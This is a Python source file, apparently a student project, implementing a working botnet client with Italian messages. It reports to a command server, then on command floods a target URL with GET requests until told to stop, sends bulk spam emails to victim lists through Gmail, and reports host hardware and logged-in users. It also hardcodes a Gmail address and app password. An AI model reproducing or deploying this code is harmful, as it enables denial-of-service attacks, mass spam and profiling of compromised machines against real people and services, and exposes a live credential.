import concurrent
import json
import platform
import smtplib
import socket
import threading
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor
from email.mime.text import MIMEText
from http.server import HTTPServer, BaseHTTPRequestHandler

import psutil
import requests

# server_address = ('10.0.2.15', 15200)


server_address = ('localhost', 15200)


# def next_free_port(p=1024, max_port=65535):
#     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     while p <= max_port:
#         try:
#             sock.bind(('', p))
#             sock.close()
#             return p
#         except OSError:
#             p += 1
#     raise IOError('Non ci sono porte disponibili')


def initialize_bot():
    print("Initializing bot...")
    with ThreadPoolExecutor(max_workers=3) as ex:
        x = ex.submit(run)

        concurrent.futures.wait([x], return_when=concurrent.futures.ALL_COMPLETED)

        ex.shutdown(wait=True)


def run():
    server = HTTPServer(('', 0), Bot)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_address[0], server_address[1]))
    s.send(json.dumps({
        'ip': s.getsockname()[0],
        'port': server.server_port
    }).encode('utf-8'))
    s.close()
    server.serve_forever()


def get_client_info():
    return {
        "cpu": platform.processor(),
        "cpu_usage": psutil.cpu_percent(),
        "ram": round(psutil.virtual_memory().total / (1024.0 ** 3), 2),
        "ram_usage": psutil.virtual_memory().percent,
        "system": platform.system(),
        "cores": psutil.cpu_count(logical=False),
        "total_cores": psutil.cpu_count(),
        "users": psutil.users(),
    }


class Bot(BaseHTTPRequestHandler):
    event = Event()

    current_action = {
        'operation': 'In attesa di un comando',
        'targets': [],
    }

    def set_header(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

    def start_thread(self, t):
        t.daemon = True
        t.start()

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))

    def log_message(self, f, *args):
        return

    def do_GET(self):
        if self.path == "/status":
            self.set_header()
            self.wfile.write(json.dumps(self.current_action).encode('utf-8'))
        if self.path == "/client-info":
            self.set_header()
            self.wfile.write(json.dumps(get_client_info()).encode('utf-8'))
        if self.path == "/stop-attack":
            self.event.set()
            self.set_header()
            self.wfile.write(json.dumps({'success': "Attacco fermato con successo"}).encode('utf-8'))

    def do_POST(self):
        if self.path == "/attack":
            content_length = int(self.headers['Content-Length'])
            body = json.loads(self.rfile.read(content_length).decode('utf-8'))

            t = threading.Thread(target=self.request_spam, args=(body['url'], self.event))
            self.start_thread(t)
        if self.path == "/mail-spam":
            content_length = int(self.headers['Content-Length'])
            body = json.loads(self.rfile.read(content_length).decode('utf-8'))

            t = threading.Thread(target=self.mail_spam,
                                 args=(body['emails'], body['message'], body["mail_object"], body["number_of_emails"]))
            self.start_thread(t)

    def mail_spam(self, victims, message, obj, number_of_emails):
        sender = "botnetsicurezza@gmail.com"
        password = "cebqshlncuewhjso"
        self.current_action['operation'] = 'Mail spam in corso'
        self.current_action['targets'] = victims
        for _ in range(number_of_emails):
            for victim in victims:
                msg = MIMEText(message)
                msg['Subject'] = obj
                msg['From'] = sender
                msg['To'] = victim
                smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                smtp_server.login(sender, password)
                smtp_server.sendmail(sender, victim, msg.as_string())
                smtp_server.quit()
        self.reset_current_action()

    def request_spam(self, url, e):
        self.current_action['operation'] = 'Attacco in corso'
        self.current_action['targets'] = [url]
        e.clear()
        while not e.is_set():
            res = requests.get(url)
            print(f"Request sent to {url} with status code {res.status_code}")
        self.reset_current_action()

    def reset_current_action(self):
        self.current_action['operation'] = 'In attesa di un comando'
        self.current_action['targets'] = []


if __name__ == '__main__':
    initialize_bot()
